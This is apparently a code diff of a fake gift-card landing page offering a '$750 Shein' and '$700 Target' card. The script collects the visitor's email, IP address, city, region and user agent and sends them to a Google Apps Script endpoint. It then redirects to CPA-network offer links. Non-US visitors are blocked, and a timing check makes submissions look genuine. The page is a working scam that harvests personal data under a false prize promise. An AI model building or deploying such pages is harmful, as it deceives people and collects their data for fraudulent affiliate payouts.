@@ -2,158 +2,155 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Gift Card Rewards</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Claim Your Rewards</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f8f8f8;
+      background: #f2f2f2;
       margin: 0;
       padding: 0;
       text-align: center;
     }
-    .highlight-bar {
-      background-color: #ffcc00;
+    .top-bar {
+      background: #ffcc00;
       color: #000;
       font-weight: bold;
-      padding: 10px;
-      font-size: 18px;
+      padding: 12px;
+      font-size: 16px;
     }
-    .offer-section {
+    .offer {
       background: #fff;
+      border-radius: 10px;
       margin: 20px auto;
-      max-width: 600px;
-      border-radius: 12px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
       padding: 20px;
+      width: 90%;
+      max-width: 500px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
-    .offer-title {
+    .offer img {
+      width: 100%;
+      border-radius: 10px;
+    }
+    .offer h2 {
+      margin: 10px 0 5px;
       font-size: 22px;
-      margin-bottom: 10px;
-      font-weight: bold;
+      color: #333;
     }
-    .offer-desc {
-      margin: 10px 0;
-      color: #555;
+    .offer p {
+      color: #666;
+      font-size: 14px;
+      margin-bottom: 15px;
     }
-    .offer-img {
-      max-width: 100%;
-      border-radius: 8px;
-    }
-    .email-form {
-      margin-top: 15px;
-    }
-    input[type="email"] {
+    .offer input {
       padding: 10px;
       width: 80%;
-      border: 1px solid #ccc;
-      border-radius: 8px;
       margin-bottom: 10px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
     }
-    .submit-btn {
-      padding: 10px 20px;
+    .offer button {
+      padding: 12px 20px;
+      background: #28a745;
       border: none;
-      border-radius: 8px;
-      color: #fff;
+      color: white;
+      font-weight: bold;
       cursor: pointer;
+      border-radius: 5px;
     }
-    .shein-btn { background-color: #f5ba00; }
-    .target-btn { background-color: #cc0000; }
-    .hidden { display: none; }
     .separator {
-      border-top: 2px dashed #ccc;
-      margin: 40px auto;
-      width: 80%;
+      height: 2px;
+      background: #ffcc00;
+      width: 90%;
+      margin: 30px auto;
     }
-    .error-message {
+    .geo-message {
       color: red;
       font-weight: bold;
-      margin-top: 15px;
+      margin: 20px 0;
     }
   </style>
 </head>
 <body>
 
-  <div class="highlight-bar">
-    Guys do it potentially so you can get rid from cyber james eventually
-  </div>
+<div class="top-bar">Guys do it potentially so you can get rid from cyber james eventually</div>
 
-  <!-- Non-US Message -->
-  <div id="geoMessage" class="error-message hidden">
-    Your IP Location is not according to Offer Requirements.
-  </div>
+<div id="geoCheck"></div>
 
-  <!-- Shein Offer -->
-  <div class="offer-section" id="sheinOffer">
-    <div class="offer-title">Shein Gift Card $750</div>
-    <img class="offer-img" src="https://i.imgur.com/yMgf0wr.jpg" alt="Shein Gift Card">
-    <div class="offer-desc">CPA GRIP Email and Zip submit</div>
-    <form class="email-form" onsubmit="submitForm(event, 'https://singingfiles.com/show.php?l=0&u=2425645&id=68776')">
-      <input type="email" name="email" placeholder="Enter your valid email" required><br>
-      <button type="submit" class="submit-btn shein-btn">Claim Now</button>
-    </form>
-  </div>
+<div class="offer" id="shein-offer">
+  <img src="https://i.imgur.com/svLeSnN.jpg" alt="Shein Gift Card">
+  <h2>Shein Gift Card $750</h2>
+  <p>CPA GRIP Email and Zip Submit</p>
+  <input type="email" placeholder="Enter your email" id="shein-email">
+  <br>
+  <button onclick="submitLead('shein')">Submit & Continue</button>
+</div>
 
-  <div class="separator"></div>
+<div class="separator"></div>
 
-  <!-- Target Offer -->
-  <div class="offer-section" id="targetOffer">
-    <div class="offer-title">Target Gift Card $700</div>
-    <img class="offer-img" src="https://i.imgur.com/X2yqtBS.png" alt="Target Gift Card">
-    <div class="offer-desc">CPA LEAD Complete Level 1</div>
-    <form class="email-form" onsubmit="submitForm(event, 'https://lnksforyou.com/view.php?id=5541382&pub=3284681')">
-      <input type="email" name="email" placeholder="Enter your valid email" required><br>
-      <button type="submit" class="submit-btn target-btn">Claim Now</button>
-    </form>
-  </div>
+<div class="offer" id="target-offer">
+  <img src="https://i.imgur.com/CBFeR9z.jpg" alt="Target Gift Card">
+  <h2>Target $700 Gift Card</h2>
+  <p>CPA LEAD Complete Level 1</p>
+  <input type="email" placeholder="Enter your email" id="target-email">
+  <br>
+  <button onclick="submitLead('target')">Submit & Continue</button>
+</div>
 
-  <script>
-    const scriptURL = "https://script.google.com/macros/s/AKfycbzp-tqrhJk07gJyV4YP-ulhfLVF1_QOKM7ePOYIlL6T81dsFyYc2p0CWyStb8XULe0X7w/exec"; 
-    const allowedCountry = "US";
-    const minTime = 10; // Minimum 10 seconds before valid submit
-    const startTime = Date.now();
+<script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbzp-tqrhJk07gJyV4YP-ulhfLVF1_QOKM7ePOYIlL6T81dsFyYc2p0CWyStb8XULe0X7w/exec';
+  let pageLoadTime = Date.now();
 
-    // Check location
-    fetch("https://ipapi.co/json/")
-      .then(res => res.json())
-      .then(data => {
-        if (data.country !== allowedCountry) {
-          document.getElementById("geoMessage").classList.remove("hidden");
-          document.getElementById("sheinOffer").classList.add("hidden");
-          document.getElementById("targetOffer").classList.add("hidden");
-        }
-        window.visitorInfo = {
-          ip: data.ip,
-          city: data.city,
-          region: data.region,
-          country: data.country
-        };
-      });
+  async function getIPInfo() {
+    const res = await fetch('https://ipapi.co/json/');
+    return res.json();
+  }
 
-    // Submit form
-    function submitForm(e, redirectURL) {
-      e.preventDefault();
-
-      const email = e.target.email.value;
-      if (!email.includes("@")) return alert("Enter valid email.");
-
-      const elapsed = (Date.now() - startTime) / 1000;
-      if (elapsed < minTime) return alert("Please stay at least 10 seconds before submitting.");
-
-      const ua = navigator.userAgent;
-      const { ip, city, region } = window.visitorInfo || {};
-
-      fetch(scriptURL + 
-        `?email=${encodeURIComponent(email)}&ip=${ip}&city=${city}&region=${region}&ua=${ua}`, 
-        { method: "GET" }
-      )
-      .then(() => {
-        window.location.href = redirectURL;
-      })
-      .catch(() => {
-        alert("Submission failed. Try again.");
-      });
+  async function submitLead(type) {
+    const now = Date.now();
+    if ((now - pageLoadTime) < 7000) {
+      alert("Please wait at least 7 seconds before submitting.");
+      return;
     }
-  </script>
+
+    const email = document.getElementById(`${type}-email`).value.trim();
+    if (!email || !email.includes("@")) {
+      alert("Please enter a valid email address.");
+      return;
+    }
+
+    const ipData = await getIPInfo();
+
+    if (ipData.country !== "US") {
+      alert("Your IP location is not according to Offer Requirements.");
+      return;
+    }
+
+    const formData = new URLSearchParams();
+    formData.append("email", email);
+    formData.append("ip", ipData.ip);
+    formData.append("city", ipData.city);
+    formData.append("region", ipData.region);
+    formData.append("ua", navigator.userAgent);
+
+    fetch(scriptURL, { method: "POST", body: formData });
+
+    const offerLinks = {
+      shein: "https://singingfiles.com/show.php?l=0&u=2425645&id=68776",
+      target: "https://lnksforyou.com/view.php?id=5541382&pub=3284681"
+    };
+
+    window.location.href = offerLinks[type];
+  }
+
+  window.onload = async () => {
+    const ip = await getIPInfo();
+    if (ip.country !== "US") {
+      document.getElementById("geoCheck").innerHTML = '<div class="geo-message">Your IP location is not according to Offer Requirements.</div>';
+      document.getElementById("shein-offer").style.display = "none";
+      document.getElementById("target-offer").style.display = "none";
+    }
+  };
+</script>
+
 </body>
 </html>
